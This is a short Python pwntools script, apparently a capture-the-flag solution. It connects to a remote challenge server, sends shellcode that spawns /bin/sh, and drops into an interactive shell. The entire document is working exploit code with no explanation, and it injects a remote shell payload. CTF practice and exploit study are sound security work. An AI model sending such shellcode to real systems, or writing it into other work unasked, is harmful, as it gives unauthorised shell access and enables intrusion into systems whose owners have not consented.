from pwn import *

io = remote("node4.buuoj.cn", 26765)

shellcode = asm(shellcraft.sh())
io.send(shellcode)

io.interactive()